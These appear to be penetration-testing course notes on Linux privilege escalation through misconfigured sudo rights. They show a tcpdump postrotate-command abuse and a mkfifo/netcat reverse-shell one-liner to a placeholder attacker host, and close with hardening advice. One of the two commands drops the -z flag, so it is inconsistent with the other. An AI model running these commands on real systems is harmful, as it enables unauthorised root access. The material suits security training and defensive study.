## Table of Contents

  - [Table of Contents](#Table\of\Contents)

## Table of Contents


Sudo privileges can be granted to an account, permitting the account to run certain commands in the context of the root (or another account) without having to change users or grant excessive privileges. When the `sudo` command is issued, the system will check if the user issuing the command has the appropriate rights, as configured in `/etc/sudoers`. 

When landing on a system always check to see if the current user has any sudo privileges with `sudo -l`. Sometimes we will need to throw the user's passwords to list their rights, but any rights entries with `NOPASSWD` option can be seen without entering a password


It is easy to misconfigure this, for example, a user may be granted root-level permissions without requiring a password, or the permitted command line might be specified too loosely, allowing us to run a program in an unintended way, resulting in privilege escalation. For example, if the sudoers file is edited to grant a user the right to run a command such as `tcpdump`, per the following entry in the sudoers file: `(ALL) NOPASSWD: /usr/bin/tcpdump` an attacker could leverage this to take advantage of the `postrotate-command` option
```bash
man tcpdump
<SNIP>
-z postrotate-comand
```
`-z`: an attacker could use `tcpdump` to execute a shell script, gain a reverse shell as the root user or run other privileged commands. For example, an attacker could create the shell script `.test` containing a reverse shell and execute it as follows:
```bash
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -x /tmp/.test -Z root
```
To try this out, add the file `/tmp/.test` with the reverse shell one-liner to bused during execution
```bash
cat /tmp/.test

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc MACHINE.IP 443 >/tmp/f
```
Next, start a netcat listener on our attack box. Then run `tcpdump` as root with the `postrotate-command`. If all goes to plan, we should receive a root reverse shell connection
```bash
sudo /usr/bin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 /tmp/.test -Z root
```
We will receive a root shell instantly.
[AppArmor](https://wiki.ubuntu.com/AppArmor) in more recent distributions has predefined the commands used with the `postrotate-command`, effectively preventing command execution. Two best practices that should always be considered when provisioning `sudo` rights:
1. Always specify the absolute path to any binaries listed in the `sudoers` file entry. Otherwise, an attacker may be able to leverage PATH abuse (which we will see in the next section) to create a malicious binary that will be executed when the command runs (i.e., if the `sudoers` entry specifies `cat` instead of `/bin/cat` this could likely be abused).|
2. Grant `sudo` rights sparingly and based on the principle of least privilege. Does the user need full `sudo` rights? Can they still perform their job with one or two entries in the `sudoers` file? Limiting the privileged command that a user can run will greatly reduce the likelihood of successful privilege escalation.|














